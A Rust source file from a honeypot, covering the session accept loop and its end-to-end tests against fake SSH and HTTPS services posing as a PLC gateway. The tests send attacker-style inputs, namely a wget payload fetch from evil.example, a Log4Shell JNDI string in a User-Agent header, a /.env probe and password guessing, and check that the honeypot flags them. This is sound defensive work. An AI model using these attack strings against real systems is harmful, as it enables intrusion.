//! Accept loop and per-session supervision: connection cap, timeout and
//! panic isolation, so one bad session can never take down the listener.

use std::net::SocketAddr;
use std::panic::AssertUnwindSafe;
use std::sync::Arc;
use std::time::Duration;

use futures_util::FutureExt;
use hp_core::{AsyncStream, BehaviorFactory, Limits, Persona, Protocol, SessionCtx};
use hp_log::{LogSink, Record, RejectReason};
use tokio::net::TcpListener;
use tokio::sync::Semaphore;

/// Tunables for a [`Server`].
pub struct Settings {
    pub limits: Limits,
    pub persona: Persona,
    /// Concurrent session cap.
    pub max_sessions: usize,
    /// Wrap every connection in TLS before the plugin sees it.
    pub tls: Option<Arc<hp_tls::Acceptor>>,
}

pub struct Server {
    proto: Arc<dyn Protocol>,
    behavior: Arc<dyn BehaviorFactory>,
    sink: LogSink,
    limits: Limits,
    persona: Persona,
    permits: Arc<Semaphore>,
    tls: Option<Arc<hp_tls::Acceptor>>,
}

impl Server {
    pub fn new(
        proto: Arc<dyn Protocol>,
        behavior: Arc<dyn BehaviorFactory>,
        sink: LogSink,
        settings: Settings,
    ) -> Arc<Server> {
        Arc::new(Server {
            proto,
            behavior,
            sink,
            limits: settings.limits,
            persona: settings.persona,
            permits: Arc::new(Semaphore::new(settings.max_sessions)),
            tls: settings.tls,
        })
    }

    /// Name of the protocol being served (for startup diagnostics).
    pub fn protocol_name(&self) -> &'static str {
        self.proto.name()
    }

    pub async fn serve(self: Arc<Self>, listener: TcpListener) {
        loop {
            match listener.accept().await {
                Ok((stream, peer)) => self.clone().spawn_session(stream, peer),
                Err(e) => {
                    // e.g. out of file descriptors: back off instead of spinning.
                    tracing::warn!(error = %e, "accept failed");
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        }
    }

    /// One session: the TLS layer (if configured), then the plugin. Both run
    /// under the session's timeout and panic guard.
    async fn run<S: AsyncStream + 'static>(
        &self,
        stream: S,
        ctx: SessionCtx,
    ) -> anyhow::Result<()> {
        let stream: Box<dyn AsyncStream> = match &self.tls {
            Some(tls) => tls.accept(stream, &ctx.log).await?,
            None => Box::new(stream),
        };
        self.proto.handle(stream, ctx).await
    }

    fn spawn_session<S: AsyncStream + 'static>(self: Arc<Self>, stream: S, peer: SocketAddr) {
        let id = uuid::Uuid::new_v4().to_string();
        let log = self.sink.session(&id, peer, self.proto.name());
        // Over the cap: drop the connection (closing it) rather than queue.
        let Ok(permit) = self.permits.clone().try_acquire_owned() else {
            log.event(Record::Rejected {
                reason: RejectReason::MaxSessions,
            });
            return;
        };
        let ctx = SessionCtx {
            session_id: id,
            peer,
            log: log.clone(),
            persona: self.persona.clone(),
            limits: self.limits.clone(),
            behavior: self.behavior.start(&log),
        };
        tokio::spawn(async move {
            let _permit = permit;
            log.event(Record::Connect);
            let run = AssertUnwindSafe(self.run(stream, ctx)).catch_unwind();
            match tokio::time::timeout(self.limits.session_timeout, run).await {
                Err(_) => log.event(Record::Timeout),
                Ok(Err(_)) => log.event(Record::Panic),
                Ok(Ok(Err(e))) => log.event(Record::Error {
                    error: e.to_string(),
                }),
                Ok(Ok(Ok(()))) => {}
            }
            log.event(Record::Disconnect);
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::behavior::TrackFactory;
    use async_trait::async_trait;
    use hp_core::Passive;
    use serde_json::Value;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use tokio::sync::mpsc::Receiver;

    enum Mode {
        Echo,
        Panic,
        Fail,
        Hang,
    }
    struct Test(Mode);

    #[async_trait]
    impl Protocol for Test {
        fn name(&self) -> &'static str {
            "test"
        }
        fn default_ports(&self) -> &[u16] {
            &[]
        }
        async fn handle(
            &self,
            mut s: Box<dyn AsyncStream>,
            _ctx: SessionCtx,
        ) -> anyhow::Result<()> {
            match self.0 {
                Mode::Echo => {
                    let mut b = [0u8; 16];
                    let n = s.read(&mut b).await?;
                    s.write_all(&b[..n]).await?;
                    Ok(())
                }
                Mode::Panic => panic!("boom"),
                Mode::Fail => anyhow::bail!("nope"),
                Mode::Hang => {
                    tokio::time::sleep(Duration::from_secs(3600)).await;
                    Ok(())
                }
            }
        }
    }

    async fn start(
        mode: Mode,
        max_sessions: usize,
        timeout: Duration,
    ) -> (SocketAddr, Receiver<String>) {
        let persona = Persona::default();
        serve(
            Arc::new(Test(mode)),
            Arc::new(Passive),
            persona,
            max_sessions,
            timeout,
        )
        .await
    }

    async fn serve(
        proto: Arc<dyn Protocol>,
        behavior: Arc<dyn BehaviorFactory>,
        persona: Persona,
        max_sessions: usize,
        timeout: Duration,
    ) -> (SocketAddr, Receiver<String>) {
        let (sink, rx) = LogSink::channel(64);
        let limits = Limits {
            session_timeout: timeout,
            max_input_bytes: 1024,
        };
        let settings = Settings {
            limits,
            persona,
            max_sessions,
            tls: None,
        };
        let server = Server::new(proto, behavior, sink, settings);
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(server.serve(listener));
        (addr, rx)
    }

    /// Collect record kinds until `last` is seen (or fail after 5s).
    async fn kinds_until(rx: &mut Receiver<String>, last: &str) -> Vec<String> {
        let mut kinds = vec![];
        loop {
            let line = tokio::time::timeout(Duration::from_secs(5), rx.recv())
                .await
                .expect("timed out")
                .unwrap();
            let k = serde_json::from_str::<Value>(&line).unwrap()["kind"]
                .as_str()
                .unwrap()
                .to_string();
            kinds.push(k.clone());
            if k == last {
                return kinds;
            }
        }
    }

    const LONG: Duration = Duration::from_secs(60);

    #[tokio::test]
    async fn runs_a_session_and_logs_lifecycle() {
        let (addr, mut rx) = start(Mode::Echo, 4, LONG).await;
        let mut c = TcpStream::connect(addr).await.unwrap();
        c.write_all(b"ping").await.unwrap();
        let mut got = [0u8; 4];
        c.read_exact(&mut got).await.unwrap();
        assert_eq!(&got, b"ping");
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "disconnect"]
        );
    }

    #[tokio::test]
    async fn panic_is_contained_and_listener_survives() {
        let (addr, mut rx) = start(Mode::Panic, 4, LONG).await;
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "panic", "disconnect"]
        );
        // The listener still accepts new sessions.
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "panic", "disconnect"]
        );
    }

    #[tokio::test]
    async fn plugin_errors_are_logged() {
        let (addr, mut rx) = start(Mode::Fail, 4, LONG).await;
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "error", "disconnect"]
        );
    }

    #[tokio::test]
    async fn sessions_time_out() {
        let (addr, mut rx) = start(Mode::Hang, 4, Duration::from_millis(50)).await;
        let mut c = TcpStream::connect(addr).await.unwrap();
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "timeout", "disconnect"]
        );
        assert_eq!(
            c.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "connection closed after timeout"
        );
    }

    /// The whole stack: real plugin, real track, real socket.
    #[tokio::test]
    async fn banner_plugin_is_driven_by_a_track_end_to_end() {
        let track = hp_track::Track::from_yaml(
            r#"
name: demo
start: s
states:
  s:
    on:
      - match: { raw: '^status' }
        do: [ { tag: queried }, { send: "OK\r\n" } ]
      - match: { raw: '^quit' }
        do: [ { send: "bye\r\n" }, { close: true } ]
    fallback: { send: "?\r\n" }
"#,
        )
        .unwrap();
        let persona = Persona {
            hostname: None,
            banner: Some("READY".into()),
        };
        let (addr, mut rx) = serve(
            Arc::new(hp_proto_banner::Banner),
            Arc::new(TrackFactory::new(track)),
            persona,
            4,
            LONG,
        )
        .await;

        let mut c = TcpStream::connect(addr).await.unwrap();
        let mut expect = async |send: &[u8], reply: &[u8]| {
            c.write_all(send).await.unwrap();
            let mut got = vec![0u8; reply.len()];
            c.read_exact(&mut got).await.unwrap();
            assert_eq!(got, reply);
        };
        expect(b"", b"READY\r\n").await;
        expect(b"status\n", b"OK\r\n").await;
        expect(b"quit\n", b"bye\r\n").await;
        assert_eq!(
            c.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "track closed the connection"
        );

        let kinds = kinds_until(&mut rx, "disconnect").await;
        assert_eq!(
            kinds,
            ["connect", "tx", "rx", "tag", "tx", "rx", "tx", "disconnect"]
        );
    }

    struct SshClient;
    impl russh::client::Handler for SshClient {
        type Error = russh::Error;
        async fn check_server_key(
            &mut self,
            _: &russh::keys::PublicKeyOrCertificate,
        ) -> Result<bool, Self::Error> {
            Ok(true)
        }
    }

    /// The shipped example track, through the real SSH plugin, over a socket,
    /// with a real SSH client: three failed logins, then in; a payload fetch
    /// is faked and flagged. (Delays are shortened to keep the test fast.)
    #[tokio::test]
    async fn example_ssh_track_end_to_end() {
        let yaml = include_str!("../../../tracks/ssh-linux-gateway.yaml")
            .replace("800ms..1500ms", "1ms")
            .replace("delay: 400ms", "delay: 1ms")
            .replace("2s..4s", "1ms");
        let track = hp_track::Track::from_yaml(&yaml).unwrap();
        let persona = Persona {
            hostname: Some("plc-gw-03".into()),
            banner: None,
        };
        let ssh = hp_proto_ssh::Ssh::new(None).unwrap();
        let (addr, mut rx) = serve(
            Arc::new(ssh),
            Arc::new(TrackFactory::new(track)),
            persona,
            4,
            LONG,
        )
        .await;

        let tcp = TcpStream::connect(addr).await.unwrap();
        let mut c = russh::client::connect_stream(
            Arc::new(russh::client::Config::default()),
            tcp,
            SshClient,
        )
        .await
        .unwrap();
        for pw in ["123456", "admin", "password"] {
            assert!(
                !c.authenticate_password("admin", pw)
                    .await
                    .unwrap()
                    .success(),
                "{pw}"
            );
        }
        assert!(c
            .authenticate_password("admin", "hunter2")
            .await
            .unwrap()
            .success());

        let run = async |command: &str| {
            let mut ch = c.channel_open_session().await.unwrap();
            ch.exec(true, command).await.unwrap();
            let mut out = vec![];
            while let Some(msg) = ch.wait().await {
                if let russh::ChannelMsg::Data { data } = msg {
                    out.extend_from_slice(&data);
                }
            }
            String::from_utf8(out).unwrap()
        };
        assert_eq!(run("whoami").await, "admin\n");
        assert!(run("uname -a").await.starts_with("Linux plc-gw-03 5.15.0"));
        assert!(run("wget http://evil.example/x/bot.sh")
            .await
            .contains("Saving to: 'bot.sh'"));
        assert_eq!(
            run("frobnicate").await,
            "-bash: frobnicate: command not found\n"
        );
        let _ = c.disconnect(russh::Disconnect::ByApplication, "", "").await;

        let kinds = kinds_until(&mut rx, "disconnect").await;
        let count = |k: &str| kinds.iter().filter(|x| *x == k).count();
        assert_eq!(count("auth"), 4);
        assert_eq!(count("command"), 4);
        assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
        assert_eq!(count("transition"), 1);
        assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
    }

    /// The container path, minus Docker: SSH client -> honeypot -> broker
    /// socket -> (fake) sandbox. The track admits the login; the shell that
    /// answers is the sandbox's, and the broker hardens and ends it.
    #[tokio::test]
    async fn ssh_real_shell_runs_in_a_sandbox_via_the_broker() {
        use hp_broker::{fake::FakeRunner, server::bind, Broker, Policy};

        let socket = std::env::temp_dir().join(format!("hp-bin-e2e-{}.sock", std::process::id()));
        let policy = Policy::parse(&format!(
            "socket: {}\nimage: honeypot/test:1\nhostname: plc-gw-03\nusers: [admin]\n",
            socket.display()
        ))
        .unwrap();
        let listener = bind(&policy).unwrap();
        let runner = FakeRunner::new(|l| (l != "exit").then(|| format!("ran {l}\n")));
        tokio::spawn(Broker::new(policy, runner.clone()).serve(listener));

        let yaml = include_str!("../../../tracks/ssh-real-shell.yaml")
            .replace("800ms..1500ms", "1ms")
            .replace("delay: 400ms", "delay: 1ms");
        let ssh = hp_proto_ssh::Ssh::new(None)
            .unwrap()
            .with_shell_backend(Arc::new(hp_sandbox::ContainerBackend::new(&socket)));
        let (addr, mut rx) = serve(
            Arc::new(ssh),
            Arc::new(TrackFactory::new(
                hp_track::Track::from_yaml(&yaml).unwrap(),
            )),
            Persona::default(),
            4,
            LONG,
        )
        .await;

        let tcp = TcpStream::connect(addr).await.unwrap();
        let mut c = russh::client::connect_stream(
            Arc::new(russh::client::Config::default()),
            tcp,
            SshClient,
        )
        .await
        .unwrap();
        for pw in ["a", "b", "c"] {
            assert!(!c
                .authenticate_password("admin", pw)
                .await
                .unwrap()
                .success());
        }
        assert!(c
            .authenticate_password("admin", "d")
            .await
            .unwrap()
            .success());

        let mut ch = c.channel_open_session().await.unwrap();
        ch.request_pty(true, "xterm", 100, 30, 0, 0, &[])
            .await
            .unwrap();
        ch.request_shell(true).await.unwrap();
        let mut seen = String::new();
        let mut read_until = async |ch: &mut russh::Channel<russh::client::Msg>, needle: &str| {
            while !seen.contains(needle) {
                match tokio::time::timeout(Duration::from_secs(5), ch.wait()).await {
                    Ok(Some(russh::ChannelMsg::Data { data })) => {
                        seen.push_str(&String::from_utf8_lossy(&data))
                    }
                    Ok(Some(_)) => {}
                    other => panic!("waiting for {needle:?}, got {other:?} after {seen:?}"),
                }
            }
        };
        read_until(&mut ch, "fake$ ").await;
        ch.data(&b"id\n"[..]).await.unwrap();
        read_until(&mut ch, "ran id").await;
        ch.data(&b"exit\n"[..]).await.unwrap();
        let _ = c.disconnect(russh::Disconnect::ByApplication, "", "").await;

        let args = &runner.specs()[0];
        assert!(
            args.windows(2).any(|w| w == ["--network", "none"]),
            "{args:?}"
        );
        let kinds = kinds_until(&mut rx, "disconnect").await;
        assert!(
            kinds.iter().any(|k| k == "rx"),
            "typed input was logged: {kinds:?}"
        );
        assert!(!kinds.iter().any(|k| k == "error"), "{kinds:?}");
    }

    /// Accepts any certificate, as scanners do.
    #[derive(Debug)]
    struct AnyCert(Arc<rustls::crypto::CryptoProvider>);
    impl rustls::client::danger::ServerCertVerifier for AnyCert {
        fn verify_server_cert(
            &self,
            _: &rustls::pki_types::CertificateDer<'_>,
            _: &[rustls::pki_types::CertificateDer<'_>],
            _: &rustls::pki_types::ServerName<'_>,
            _: &[u8],
            _: rustls::pki_types::UnixTime,
        ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
            Ok(rustls::client::danger::ServerCertVerified::assertion())
        }
        fn verify_tls12_signature(
            &self,
            _: &[u8],
            _: &rustls::pki_types::CertificateDer<'_>,
            _: &rustls::DigitallySignedStruct,
        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn verify_tls13_signature(
            &self,
            _: &[u8],
            _: &rustls::pki_types::CertificateDer<'_>,
            _: &rustls::DigitallySignedStruct,
        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
            self.0.signature_verification_algorithms.supported_schemes()
        }
    }

    /// The shipped HTTP track, through the real HTTP plugin behind the TLS
    /// layer, over a socket, with a real TLS client: the hello is
    /// fingerprinted, two logins fail, the third gets a session cookie that
    /// opens the console, and the probes along the way are flagged.
    #[tokio::test]
    async fn example_https_track_end_to_end() {
        let yaml = include_str!("../../../tracks/http-ops-portal.yaml")
            .replace("600ms..1200ms", "1ms")
            .replace("delay: 400ms", "delay: 1ms");
        let track = hp_track::Track::from_yaml(&yaml).unwrap();
        let tls = hp_tls::Acceptor::new(&hp_tls::CertSource::SelfSigned {
            names: vec!["plc-gw-03".into()],
            organization: None,
        })
        .unwrap();
        let (sink, mut rx) = LogSink::channel(256);
        let settings = Settings {
            limits: Limits {
                session_timeout: LONG,
                max_input_bytes: 1 << 20,
            },
            persona: Persona {
                hostname: None,
                banner: Some("nginx/1.18.0 (Ubuntu)".into()),
            },
            max_sessions: 4,
            tls: Some(Arc::new(tls)),
        };
        let server = Server::new(
            Arc::new(hp_proto_http::Http),
            Arc::new(TrackFactory::new(track)),
            sink,
            settings,
        );
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(server.serve(listener));

        let provider = Arc::new(rustls::crypto::ring::default_provider());
        let config = rustls::ClientConfig::builder_with_provider(provider.clone())
            .with_safe_default_protocol_versions()
            .unwrap()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(AnyCert(provider)))
            .with_no_client_auth();
        let connector = tokio_rustls::TlsConnector::from(Arc::new(config));
        let tcp = TcpStream::connect(addr).await.unwrap();
        let name = rustls::pki_types::ServerName::try_from("plc-gw-03").unwrap();
        let mut tls = connector.connect(name, tcp).await.unwrap();

        let login = |pw: &str| {
            let body = format!("username=admin&password={pw}");
            format!(
                "POST /login HTTP/1.1\r\nHost: plc-gw-03\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: {}\r\n\r\n{body}",
                body.len()
            )
        };
        let mut script = String::from("GET / HTTP/1.1\r\nHost: plc-gw-03\r\n\r\n");
        script += "GET /.env HTTP/1.1\r\nHost: plc-gw-03\r\n\r\n";
        script += &login("admin");
        script += &login("password");
        script += &login("Winter2025!");
        script += "GET /dashboard HTTP/1.1\r\nHost: plc-gw-03\r\n\
                   Cookie: GWSESSID=a81f03c2e4b7d9165c0e\r\n\r\n";
        script += "GET /dashboard/overview HTTP/1.1\r\nHost: plc-gw-03\r\n\
                   User-Agent: ${jndi:ldap://10.9.9.9/a}\r\nConnection: close\r\n\r\n";
        tls.write_all(script.as_bytes()).await.unwrap();
        let mut got = vec![];
        tls.read_to_end(&mut got).await.unwrap();
        let got = String::from_utf8(got).unwrap();
        let statuses: Vec<&str> = got.lines().filter(|l| l.starts_with("HTTP/1.1 ")).collect();
        assert_eq!(
            statuses,
            [
                "HTTP/1.1 200 OK",
                "HTTP/1.1 200 OK",
                "HTTP/1.1 200 OK",
                "HTTP/1.1 200 OK",
                "HTTP/1.1 302 Found",
                "HTTP/1.1 200 OK",
                "HTTP/1.1 400 Bad Request",
            ],
            "{got}"
        );
        assert!(got.contains("Gateway Management Console"));
        assert!(got.contains("DB_PASSWORD=Gw!c0ns0le-2023"));
        assert_eq!(got.matches("Invalid username or password.").count(), 2);
        assert!(got.contains("Location: /dashboard\r\n"));
        assert!(got.contains("<h2>Overview</h2>"));
        assert!(got.contains("Server: nginx/1.18.0 (Ubuntu)\r\n"));

        let mut recs = vec![];
        loop {
            let line = tokio::time::timeout(Duration::from_secs(5), rx.recv())
                .await
                .expect("timed out")
                .unwrap();
            let v: Value = serde_json::from_str(&line).unwrap();
            let done = v["kind"] == "disconnect";
            recs.push(v);
            if done {
                break;
            }
        }
        let of = |k: &str| recs.iter().filter(|r| r["kind"] == k).collect::<Vec<_>>();
        let hello = of("tls_client_hello");
        assert_eq!(hello.len(), 1);
        assert_eq!(hello[0]["sni"], "plc-gw-03");
        assert!(hello[0]["ja4"].as_str().unwrap().starts_with("t13d"));
        assert_eq!(of("http_request").len(), 7);
        let auth = of("auth");
        assert_eq!(auth.len(), 3);
        assert_eq!(auth[2]["credential"], "Winter2025!");
        assert_eq!(auth[2]["method"], "http_form");
        assert_eq!(
            (&auth[0]["accepted"], &auth[2]["accepted"]),
            (&serde_json::json!(false), &serde_json::json!(true))
        );
        let tags: Vec<&str> = of("tag")
            .iter()
            .map(|t| t["tag"].as_str().unwrap())
            .collect();
        assert_eq!(
            tags,
            [
                "secrets_probe",
                "login_attempt",
                "login_attempt",
                "auth_success",
                "console_access",
                "log4shell_attempt"
            ]
        );
        assert_eq!(
            of("behavior_error").len() + of("error").len(),
            0,
            "{recs:?}"
        );
    }

    #[tokio::test]
    async fn connections_over_the_cap_are_rejected_and_slots_are_reused() {
        let (addr, mut rx) = start(Mode::Hang, 1, Duration::from_millis(300)).await;
        let _first = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "connect").await, ["connect"]);

        let mut second = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "rejected").await, ["rejected"]);
        assert_eq!(
            second.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "rejected connection is closed"
        );

        // Once the first session times out its slot frees up.
        kinds_until(&mut rx, "disconnect").await;
        let _third = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "connect").await, ["connect"]);
    }
}
